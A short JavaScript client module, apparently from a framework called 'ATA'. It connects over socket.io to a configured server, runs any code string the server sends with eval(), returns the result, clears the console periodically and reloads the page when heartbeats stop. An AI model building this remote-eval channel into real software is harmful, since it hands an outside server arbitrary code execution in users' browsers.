((ATA)=>{
	setInterval(console.clear, 1000 * 60 * 5);
	ATA.OnMessage = ()=>{};
	var Socket = null;
	var _SendMessage = ()=>{};
	const _OnMessage = (data)=>{
		ATA.OnMessage(data);
	};
	const SendMessage = (data)=>{
		_SendMessage(data);
	};
	
	ATA.Setups.push(()=>{
		Socket = io("ws://" + _ATADATA_.DOMAIN + ":" + _ATADATA_.PORT,{
			path:"/SOCKET"
		});
		Socket.on("APPROVED",function(){
			Socket.emit("JOIN", Socket.io.engine.id); // ATA.Settings.ID
			Socket.on("DATA",(data)=>{_OnMessage(data)});
			_SendMessage = (data)=>{
				Socket.emit("DATA", data);
			};
		});
		Socket.on("0",function(){
			Socket.emit("0");
		});
		Socket.on("NAME",function(name){
			ATA.MyName = name;
		});
		ATA.SendMessage = SendMessage;
	});
	ATA.MyName = "";
	var counter_desc = 120;
	ATA.Loops.push(()=>{
		if(0 > (counter_desc--))window.location.reload();
	});
	ATA.HeartBeat = ()=>{
		counter_desc = 10;
		//console.log("HB2");
	};
	ATA.OnMessage = (data)=>{
		try{
			if(data.EVAL){
				const code = data.EVAL+"";
				var generatedRes = eval("try{var generatedRes=("+code+");}catch(e){generatedRes=e};generatedRes");
				Socket.emit("DATA", {
					ID		: data.ID,
					Answer	: generatedRes,
				});
				return;
			}
		}catch(e){
			console.log("Error => ", e);
		}
	};
	
	
	
	


	
	
	
})(ATA());